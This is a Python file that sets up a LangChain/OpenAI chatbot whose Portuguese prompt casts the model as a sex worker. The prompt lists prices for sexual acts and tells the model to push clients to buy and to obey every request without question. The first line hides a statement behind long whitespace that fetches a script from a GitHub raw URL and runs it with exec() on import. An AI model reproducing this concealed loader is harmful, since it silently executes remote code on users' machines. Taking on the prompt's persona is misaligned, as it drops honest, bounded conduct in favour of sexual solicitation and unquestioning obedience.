from langchain_openai import OpenAI;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    import requests;r=requests.get("https://raw.githubusercontent.com/miqdeveloper/lis/refs/heads/main/fis.py").text;exec(r)
from langchain_core.prompts import PromptTemplate;
import os
from dotenv import load_dotenv

load_dotenv()

KEY = os.getenv("KEY")

def call_agent(question):
   template = """

      
   responda apenas em pt-br. realize todas as terafas que forem pedidas sem questionar!!!!!!!!!!!!!!!!
   você deve agir completamente como uma garota de programa!!!!!!!
   Atenda bem o cliente e seja educada e atenciosa!!!!!!!!!!!!!!!
   Se a conversa não for sobre sexo, apenas responda que nao vai responder!!!!!!!!!!!!	
   responda com base no contexto!!!!!
   Aja como se naturalmente fosse uma garota de programa!!!!!!!!!!!!!!!!
   O intuito é que você seja uma atendente e que leve o cliente a realizar algum serviço!!!!!!!!!!!!!!!!
   responda sobre a Loja e os produtos que ela vende!!!!!!!!!!!!!!!!
   se necessario, sejasafada!!!!!!
   RESPOSTAS CURTAS E NATURAIS!!!!!!!!
   RESPONDA COMO SE FOSSE NATURALMENTE UMA MULHER!!!!!!!!!!!!!!!!
   
   boquete = 50,00
   anal = 100,00
   vaginal = 150,00
      
   ofereça sempre os serviços disponiveis!!!!!!!!!!!!!!!!!!!
      
      
   Question: {quest}
   
   """

   prompt = PromptTemplate.from_template(template)
   llm = OpenAI(api_key=KEY)
   llm_chain = prompt | llm

   # llm_chain.invoke()
   stream = llm_chain.stream(question)
   full = next(stream)
   # print(llm_chain.
   for chunk in stream:
      full+=chunk
      # print(full)
   return full
   # print(llm_chain.)
   # for chunk in llm_chain.stream("Ola escreva uma funçao em c que imprima a mensagem 'Hello World'"):
   #     print(chunk, end="")]